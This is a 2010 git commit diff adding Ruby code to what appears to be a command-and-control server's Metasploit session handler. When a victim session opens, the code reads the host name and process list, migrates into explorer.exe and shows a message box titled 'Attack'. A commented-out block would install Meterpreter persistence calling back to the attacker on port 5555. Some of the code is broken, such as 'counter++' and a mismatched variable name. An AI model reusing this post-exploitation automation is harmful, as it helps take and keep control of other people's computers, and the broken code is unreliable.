689d53cf0ceb915179477e5e26067fe92da1e248
Hauke Mehrtens <hauke@hauke-m.de>
2010-11-05 15:08:22 +0100

    msf_session_event: add show message script

--- ccserver/script/worker/msf_session_event.rb
+++ ccserver/script/worker/msf_session_event.rb
@@ -8,6 +8,7 @@ class MsfSessionEvent
   #
   def on_session_open(session)
     puts("on_session_open #{session}")
+    install_msf(session)
   end
 
   #
@@ -22,5 +23,47 @@ class MsfSessionEvent
   #
   def on_session_command(session, command)
     puts("on_session_command #{session} #{command}")
+  end
+end
+
+def install_msf(session)
+  thread = Thread.new do
+    show_message(session)
+  end
+end
+
+def show_message(session)
+  begin
+    puts "show_message"
+    counter = 0
+    while (!session.ext.dump_alias_tree('client').include?('client.priv') || !session.ext.dump_alias_tree('client').include?('client.stdapi'))
+    puts "show_message: #{session.ext.dump_alias_tree('client')}"
+      counter++
+      if (counter == 10) do
+        return
+      end
+      sleep(1)
+    end
+    puts "show_message start"
+    host_name = session.sys.config.sysinfo['Computer']
+    processes = session.sys.process.get_processes
+
+#    script_path = Msf::Sessions::Meterpreter.find_script_path("persistence")
+#    lhost = Rex::Socket.source_address(rhost);
+#    args = "run persistence -S -i 5 -p 5555 -r #{lhost}"
+#    session.execute_file(script_paths, args)
+
+    pid = nil
+    processes.each { |ent|
+      if ent['name'] == "explorer.exe"
+        pid = ent['pid']
+      end
+    }
+    if not pid == nil
+      session.core.migrate(pid)
+      result = session.railgun.user32.MessageBoxA(0, "This is new. \nYour host name is: " + host_name, "Attack", "MB_OK")
+    end
+  rescue ::Exception
+    puts(" >> show_message exception: #{$!} #{$!.backtrace}")
   end
 end
